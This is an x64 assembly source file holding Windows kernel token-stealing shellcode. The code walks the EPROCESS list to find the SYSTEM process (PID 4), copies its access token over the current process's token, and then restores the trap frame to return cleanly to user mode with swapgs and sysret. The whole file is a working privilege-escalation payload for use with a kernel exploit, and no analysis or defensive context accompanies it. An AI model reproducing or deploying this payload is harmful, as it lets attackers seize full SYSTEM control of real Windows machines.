BITS 64
global _start
section .text
    SYSTEM_PID equ 0x04
    
    ; nt!_KPCR
    Prcb equ 0x180
    
    ; nt!_KPRCB
    CurrentThread equ 0x08
    
    ; nt!_KTHREAD
    ApcState equ 0x98
    
    ; nt!_KAPC_STATE
    Process equ 0x20
    
    ; nt!_EPROCESS
    UniqueProcessId equ 0x440
    ActiveProcessLinks equ 0x448
    Token equ 0x4b8

_start:
    ; Retrieve a pointer to _ETHREAD from KPCR
    mov rdx, qword [gs:Prcb + CurrentThread]

    ; Obtain a pointer to CurrentProcess
    mov r8, [rdx + ApcState + Process]

    ; Move to the first process in the ActiveProcessLinks list
    mov rcx, [r8 + ActiveProcessLinks]

.loop_find_system_proc:
    ; Get the UniqueProcessId
    mov rdx, [rcx - ActiveProcessLinks + UniqueProcessId]

    ; Check if UniqueProcessId matches the SYSTEM process ID
    cmp rdx, SYSTEM_PID
    jz .found_system  ; IF (SYSTEM process is found)

    ; Move to the next process
    mov rcx, [rcx]
    jmp .loop_find_system_proc  ; Continue looping until the SYSTEM process is found

.found_system:
    ; Retrieve the token of the SYSTEM process
    mov rax, [rcx - ActiveProcessLinks + Token]

    ; Mask the RefCnt (lower 4 bits) of the _EX_FAST_REF structure
    and al, 0xF0

    ; Replace the CurrentProcess's token with the SYSTEM process's token
    mov [r8 + Token], rax
    
    ; CleanUP 
      mov rax, [gs:0x188]       ; _KPCR.Prcb.CurrentThread
      mov cx, [rax + 0x1e4]     ; KTHREAD.KernelApcDisable
      inc cx
      mov [rax + 0x1e4], cx
      mov rdx, [rax + 0x90]     ; ETHREAD.TrapFrame
      mov rcx, [rdx + 0x168]    ; ETHREAD.TrapFrame.Rip
      mov r11, [rdx + 0x178]    ; ETHREAD.TrapFrame.EFlags
      mov rsp, [rdx + 0x180]    ; ETHREAD.TrapFrame.Rsp
      mov rbp, [rdx + 0x158]    ; ETHREAD.TrapFrame.Rbp
      xor eax, eax  ;
      swapgs
      o64 sysret  
